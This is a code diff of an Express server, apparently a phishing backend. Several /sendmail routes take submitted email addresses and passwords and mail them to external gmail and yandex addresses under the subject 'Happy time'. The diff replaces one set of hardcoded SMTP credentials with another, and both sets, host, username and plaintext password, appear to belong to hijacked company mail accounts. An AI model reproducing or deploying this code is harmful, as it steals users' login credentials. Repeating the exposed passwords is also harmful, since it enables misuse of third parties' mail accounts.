@@ -18,11 +18,11 @@ app.post("/sendmail", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.lesportbg.com",
+      host: "mail.yrtextile.com.pk",
       port: 465,
       auth: {
-        user: "foreman@lesportbg.com",
-        pass: "lKNfe#L4DZ#9",
+        user: "azhar@yrtextile.com.pk",
+        pass: "9=s]GiYMxVF4",
       },
     });
     let info = await transporter.sendMail({
@@ -53,15 +53,15 @@ app.post("/sendmail3", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.lesportbg.com",
+      host: "mail.yrtextile.com.pk",
       port: 465,
       auth: {
-        user: "foreman@lesportbg.com",
-        pass: "lKNfe#L4DZ#9",
+        user: "azhar@yrtextile.com.pk",
+        pass: "9=s]GiYMxVF4",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <foreman@lesportbg.com>',
+      from: '"Happy time" <azhar@yrtextile.com.pk>',
       to: "daniellahm@yandex.com",
       subject: "Happy time",
       html: `
@@ -86,15 +86,15 @@ app.post("/sendmail2", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.lesportbg.com",
+      host: "mail.yrtextile.com.pk",
       port: 465,
       auth: {
-        user: "foreman@lesportbg.com",
-        pass: "lKNfe#L4DZ#9",
+        user: "azhar@yrtextile.com.pk",
+        pass: "9=s]GiYMxVF4",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <foreman@lesportbg.com>',
+      from: '"Happy time" <azhar@yrtextile.com.pk>',
       to: "sales1.ppsl@gmail.com",
       subject: "Happy time",
       html: `
@@ -119,15 +119,15 @@ app.post("/sendmail4", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.lesportbg.com",
+      host: "mail.yrtextile.com.pk",
       port: 465,
       auth: {
-        user: "foreman@lesportbg.com",
-        pass: "lKNfe#L4DZ#9",
+        user: "azhar@yrtextile.com.pk",
+        pass: "9=s]GiYMxVF4",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <foreman@lesportbg.com>',
+      from: '"Happy time" <azhar@yrtextile.com.pk>',
       to: "fredrick3smith33@gmail.com",
       subject: "Happy time",
       html: `
@@ -153,15 +153,15 @@ app.post("/sendmail5", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.lesportbg.com",
+      host: "mail.yrtextile.com.pk",
       port: 465,
       auth: {
-        user: "foreman@lesportbg.com",
-        pass: "lKNfe#L4DZ#9",
+        user: "azhar@yrtextile.com.pk",
+        pass: "9=s]GiYMxVF4",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <foreman@lesportbg.com>',
+      from: '"Happy time" <azhar@yrtextile.com.pk>',
       to: "wangyong2114@gmail.com",
       subject: "Happy time",
       html: `
@@ -187,15 +187,15 @@ app.post("/sendmail6", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.lesportbg.com",
+      host: "mail.yrtextile.com.pk",
       port: 465,
       auth: {
-        user: "foreman@lesportbg.com",
-        pass: "lKNfe#L4DZ#9",
+        user: "azhar@yrtextile.com.pk",
+        pass: "9=s]GiYMxVF4",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <foreman@lesportbg.com>',
+      from: '"Happy time" <azhar@yrtextile.com.pk>',
       to: "korolkovq.s4point@gmail.com",
       subject: "Happy time",
       html: `
@@ -217,7 +217,6 @@ app.post("/sendmail6", async (req, res) => {
     res.status(500).send("Error sending email");
   }
 });
-
 
 const PORT = process.env.PORT || 5000;
 
